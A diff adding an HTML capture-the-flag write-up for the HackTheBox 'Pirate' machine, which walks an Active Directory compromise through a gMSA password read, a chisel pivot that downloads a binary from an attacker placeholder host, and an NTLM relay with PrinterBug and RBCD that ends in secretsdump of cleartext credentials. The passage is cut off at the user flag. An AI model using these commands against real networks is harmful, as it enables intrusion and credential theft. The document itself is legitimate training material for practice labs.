@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Pirate — S. Markakis</title>
+<meta name="description" content="HackTheBox Pirate — a full Active Directory chain driven from macOS: a pre-Windows 2000 machine account still holding its bootstrap password bootstraps Kerberos, a readable gMSA gives WinRM on the DC, an NTLM-relay + PrinterBug coercion plants RBCD on an internal web server to recover a domain user, a ForceChangePassword unlocks a delegation account, and SPN-jacking a constrained-delegation SPN onto the DC yields Domain Admin.">
+<meta property="og:title" content="HTB: Pirate — S. Markakis">
+<meta property="og:description" content="HackTheBox Pirate — a full Active Directory chain driven from macOS: pre2k machine account → readable gMSA → RBCD via NTLM relay + PrinterBug → a domain user → ForceChangePassword → SPN-jacking a constrained-delegation SPN onto the DC for Domain Admin.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-pirate.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-pirate.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-pirate.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-pirate.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Pirate",
+  "description": "HackTheBox Pirate — a full Active Directory chain driven from macOS: a pre-Windows 2000 machine account still holding its bootstrap password bootstraps Kerberos, a readable gMSA gives WinRM on the DC, an NTLM-relay + PrinterBug coercion plants RBCD on an internal web server to recover a domain user, a ForceChangePassword unlocks a delegation account, and SPN-jacking a constrained-delegation SPN onto the DC yields Domain Admin.",
+  "datePublished": "2026-09-11",
+  "dateModified": "2026-09-11",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-pirate.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-pirate.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-pirate"
+  },
+  "timeRequired": "PT14M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Pirate</h1>
+    <div class="post-meta">
+      <span class="date">September 11, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Windows</span>
+      <span class="tag">Active Directory</span>
+      <span>&nbsp;14 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Pirate is an assumed-breach Active Directory box — you start with one low-privilege domain account — and every hop is a credential that was never supposed to be reachable. A <strong>pre-Windows 2000 machine account</strong> still holds the bootstrap password it was created with, which bootstraps Kerberos. That account can read a <strong>gMSA</strong>'s managed password, and the gMSA is in <em>Remote Management Users</em> → a WinRM shell on the DC. The DC is dual-homed, hiding an internal web server, so the next move is a classic <strong>NTLM relay</strong>: coerce the web server's machine account with <strong>PrinterBug</strong>, relay it to LDAP, and write <strong>resource-based constrained delegation</strong> so we can impersonate its local admin and pull a real domain user out of LSA. That user can <strong>ForceChangePassword</strong> a delegation account, and the delegation account's constrained-delegation SPN is <em>mutable</em> — so we <strong>SPN-jack</strong> it onto the DC and mint a Domain Admin ticket to the DC itself. The whole thing was driven from a Mac, which added a few of its own puzzles.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">pentest</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pre2k MS01$</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">gMSA → WinRM (DC01)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">RBCD relay (WEB01)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">a.white (user)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ForceChangePassword</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SPN-jack → DA</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>The box hands you a starting credential — <code>pentest : p3nt3st2025!&amp;</code> — so this is assumed-breach: no exploit for the front door, just an authenticated foothold inside the domain. A quick sweep is textbook domain controller: Kerberos, LDAP, the global catalog, SMB, and WinRM. Server 2019, domain <code>pirate.htb</code>, hostname <code>DC01</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap + credential check</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -p88,389,445,3268,5985 --open &lt;DC_IP&gt;</span>
+<span class="po">88/tcp   open  kerberos-sec
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+3268/tcp open  globalcatLDAP
+5985/tcp open  wsman</span>
+<span class="pd">$ </span><span class="pc">nxc smb &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;'</span>
+<span class="po">SMB  &lt;DC_IP&gt;  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:True)
+</span><span class="pg">SMB  &lt;DC_IP&gt;  445  DC01  [+] pirate.htb\pentest:p3nt3st2025!&amp;</span></div>
+  </div>
+
+  <p>Add the names to <code>/etc/hosts</code> (<code>pirate.htb</code>, <code>dc01.pirate.htb</code>) — Kerberos resolves service principals by hostname, so working by IP alone breaks the moment you touch a ticket.</p>
+
+  <!-- ══ PRE2K ══ -->
+  <h2>Foothold — a pre-Windows 2000 machine account</h2>
+
+  <p>Enumerating computer objects over LDAP turns up more than the two hosts you'd expect:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc ldap --computers</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' --computers</span>
+<span class="po">DC01$
+WEB01$
+MS01$
+EXCH01$
+gMSA_ADCS_prod$
+gMSA_ADFS_prod$</span></div>
+  </div>
+
+  <p>Two machine accounts — <code>MS01$</code> and <code>EXCH01$</code> — carry the <strong>Pre-Windows 2000</strong> flag. When an admin pre-creates a computer object for a host that hasn't joined the domain yet, its initial password is set to the <em>lowercase sAMAccountName without the trailing dollar sign</em>. If the host never joins (<code>lastLogon = 0</code>), that bootstrap password is still live. netexec's <code>pre2k</code> module flags exactly this:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pre2k discovery</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' -M pre2k</span>
+<span class="py">PRE2K  Pre-created computer account: MS01$
+PRE2K  Pre-created computer account: EXCH01$</span></div>
+  </div>
+
+  <p>So <code>MS01$</code>'s password should be <code>ms01</code>. You can't test that with a normal logon, though — machine accounts refuse interactive/NTLM authentication (<code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>). Everything from here on is <strong>Kerberos-only</strong>. Grab a TGT to prove the password and to carry into the next step:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">getTGT — MS01$</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pg">[*] Saving ticket in MS01$.ccache</span>
+<span class="pd">$ </span><span class="pc">export KRB5CCNAME=MS01\$.ccache</span></div>
+  </div>
+
+  <div class="alert alert-warn">macOS aside: the DC's clock was <strong>+7 hours</strong> off mine, so every raw Kerberos call died with <code>KRB_AP_ERR_SKEW</code>. Rather than reset the system clock I wrapped Impacket in <code>faketime -f '+7h' &lt;tool&gt;</code>. bloodyAD is nicer — it detects the skew and retries automatically. More on the macOS quirks at the end.</div>
+
+  <!-- ══ gMSA ══ -->
+  <h2>gMSA — reading a managed password → WinRM on the DC</h2>
+
+  <p>A <strong>group Managed Service Account</strong> has a 240-byte password that AD rotates on its own and never shows an admin. The catch: any principal listed in the gMSA's <code>msDS-GroupMSAMembership</code> (the "principals allowed to retrieve managed password" set) can read the blob over LDAP and derive the NT hash from it. Our freshly-owned <code>MS01$</code> is such a principal. bloodyAD reads it and hands back the hash directly:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD — read gMSA managed password</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">KRB5CCNAME=MS01\$.ccache bloodyAD --host dc01.pirate.htb -d pirate.htb -k \
+     get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword</span>
+<span class="po">Clock skew detected. Adjusting local time by 6:59:59. Retrying operation.
+distinguishedName: CN=gMSA_ADFS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb</span>
+<span class="pg">msDS-ManagedPassword.NT: e819498e................................</span></div>
+  </div>
+
+  <p>That NT hash is a full credential for <code>gMSA_ADFS_prod$</code> — and the account happens to be in <em>Remote Management Users</em>, so it can log in over WinRM. netexec confirms admin-level exec, and evil-winrm drops a shell on the DC:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">WinRM as gMSA_ADFS_prod$</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc winrm dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H e819498e...</span>
+<span class="pg">WINRM  dc01.pirate.htb  5985  DC01  [+] pirate.htb\gMSA_ADFS_prod$:e819498e... (Pwn3d!)</span>
+<span class="pd">$ </span><span class="pc">evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H e819498e...</span></div>
+  </div>
+
+  <p>First thing inside: <code>ipconfig</code>. The DC is <strong>dual-homed</strong>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">DC01 interfaces</span>
+    </div>
+    <div class="term-body"><span class="pd">PS&gt; </span><span class="pc">ipconfig</span>
+<span class="po">   IPv4 Address. . . . . . : 192.168.100.1     </span><span class="pco"># internal</span><span class="po">
+   IPv4 Address. . . . . . : &lt;DC_IP&gt;            </span><span class="pco"># the network we came in on</span></div>
+  </div>
+
+  <p>There's a <code>192.168.100.0/24</code> behind the DC, and from the earlier LDAP dump we know <code>WEB01$</code> lives there — <code>192.168.100.2</code>, unreachable directly. The flags aren't on the DC's readable desktops, so the next objective is that internal host. Time to pivot.</p>
+
+  <!-- ══ PIVOT ══ -->
+  <h2>Pivoting to the internal net (from macOS)</h2>
+
+  <p>The house tunnel for this is ligolo, but its TUN + interactive console is awkward to script on macOS, so I used <strong>chisel reverse SOCKS</strong> instead — fully non-interactive, no root needed for the proxy itself. Run the server on the attack box, stage the client onto the DC over the WinRM shell, and dial back:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">chisel reverse SOCKS</span>
+    </div>
+    <div class="term-body"><span class="pco"># attacker</span>
+<span class="pd">$ </span><span class="pc">./chisel server --reverse --socks5 -p 9001</span>
+<span class="pco"># on DC01, via the WinRM shell — download + dial back</span>
+<span class="pd">PS&gt; </span><span class="pc">iwr http://&lt;ATTACKER&gt;:8000/chisel.exe -OutFile C:\Windows\Temp\c.exe</span>
+<span class="pd">PS&gt; </span><span class="pc">C:\Windows\Temp\c.exe client &lt;ATTACKER&gt;:9001 R:socks</span>
+<span class="po">server: session#2: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span></div>
+  </div>
+
+  <div class="alert alert-info">One gotcha worth knowing: a child process started from a one-shot WinRM command gets killed when that command's job object tears down. Keep the WinRM channel that launched chisel <em>open</em> (run it in the foreground of a backgrounded session) so the tunnel survives.</div>
+
+  <p>With SOCKS up on <code>127.0.0.1:1080</code>, <code>WEB01</code> is reachable — 445, 135, 5985 and an HTTP service on 80. A note for fellow Mac users: <strong>netexec breaks under proxychains</strong> (its multiprocessing workers don't inherit the <code>DYLD_INSERT_LIBRARIES</code> hook), but single-process Impacket scripts proxy fine. So the enumeration and every relay-adjacent step below run as <code>proxychains4 &lt;impacket-tool&gt;</code>.</p>
+
+  <!-- ══ RBCD ══ -->
+  <h2>WEB01 — NTLM relay → RBCD → a domain user</h2>
+
+  <p>The gMSA can authenticate to <code>WEB01</code> but isn't a local admin there (<code>rpc_s_access_denied</code> on a secrets dump). What <code>WEB01</code> <em>does</em> have is <strong>SMB signing disabled</strong> — the green light for an NTLM relay. The plan:</p>
+
+  <ol>
+    <li>Coerce <code>WEB01$</code> into authenticating to us (PrinterBug / MS-RPRN).</li>
+    <li>Relay that machine-account auth to the DC's LDAP.</li>
+    <li>Use it to write <strong>resource-based constrained delegation</strong> on <code>WEB01$</code>, trusting a computer account we control.</li>
+    <li>S4U ourselves an Administrator ticket to <code>WEB01</code> and dump its secrets.</li>
+  </ol>
+
+  <p>First, create the computer account we'll delegate through — any authenticated user can, up to <code>ms-DS-MachineAccountQuota</code> (default 10):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">add a controllable computer account</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">addcomputer.py -computer-name 'hackpuntes$' -computer-pass '1Qwerty!' \
+     -dc-host dc01.pirate.htb -hashes :e819498e... 'pirate.htb/gMSA_ADFS_prod$'</span>
+<span class="pg">[*] Successfully added machine account hackpuntes$ with password 1Qwerty!.</span></div>
+  </div>
+
+  <p>Start the relay pointing at LDAP, telling it to configure delegation for our new account. <code>--remove-mic</code> is the drop-the-MIC trick that lets an SMB→LDAP relay through even with a MIC present; the DC's LDAP isn't enforcing signing, so it lands. Binding the SMB server on 445 needs root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ntlmrelayx — RBCD attack</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo ntlmrelayx.py -t ldap://&lt;DC_IP&gt; -smb2support --remove-mic \
+     --delegate-access --escalate-user 'hackpuntes$'</span>
+<span class="po">[*] Servers started, waiting for connections</span></div>
+  </div>
+
+  <p>Now the coercion. PrinterBug's <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> makes the target's spooler authenticate back to any host we name. We send the RPC <em>to</em> <code>WEB01</code> through the SOCKS tunnel and point the callback at our own VPN IP:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">PrinterBug coercion (through proxychains)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">proxychains4 python3 printerbug.py -no-ping \
+     -hashes :e819498e... 'pirate.htb/gMSA_ADFS_prod$'@192.168.100.2 &lt;ATTACKER&gt;</span>
+<span class="po">[*] Attempting to trigger authentication via rprn RPC at 192.168.100.2
+[*] Triggered RPC backconnect, this may or may not have worked</span></div>
+  </div>
+
+  <p>It worked — the spooler's callback reached my VPN address (routed out through the DC), and the relay did its job:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ntlmrelayx — result</span>
+    </div>
+    <div class="term-body"><span class="po">[*] Authenticating connection from PIRATE/WEB01$ ... against ldap://&lt;DC_IP&gt; SUCCEED</span>
+<span class="pg">[*] Delegation rights modified succesfully!
+[*] hackpuntes$ can now impersonate users on WEB01$ via S4U2Proxy</span></div>
+  </div>
+
+  <p>RBCD is set. Now S4U2Self+S4U2Proxy as <code>hackpuntes$</code> to get a <code>cifs/WEB01</code> ticket <em>as Administrator</em>, then dump WEB01's secrets across the tunnel:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">S4U → secretsdump WEB01</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">faketime -f '+7h' getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator \
+     'pirate.htb/hackpuntes$:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pg">[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache</span>
+<span class="pd">$ </span><span class="pc">KRB5CCNAME=Administrator@cifs_WEB01...ccache \
+     proxychains4 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+<span class="po">Administrator:500:aad3b435...:b1aac158...:::               </span><span class="pco"># WEB01 local admin</span><span class="po">
+[*] DefaultPassword</span>
+<span class="pg">PIRATE\a.white:E2nvAOKSz5Xz2MJu                            </span><span class="pco"># LSA autologon secret</span></div>
+  </div>
+
+  <p>The prize is in LSA secrets: an <strong>autologon</strong> <code>DefaultPassword</code> for a real domain user, <code>a.white</code>, sitting in cleartext. That's the account whose desktop holds the user flag — read it straight off <code>WEB01</code> with the Administrator ticket we already have:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">proxychains4 smbclient.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+<span class="pd"># </span><span class="pc">use C$</span>
+<span class="pd"># </span><span class="pc">get Users\a.white\Desktop\user.txt</span>
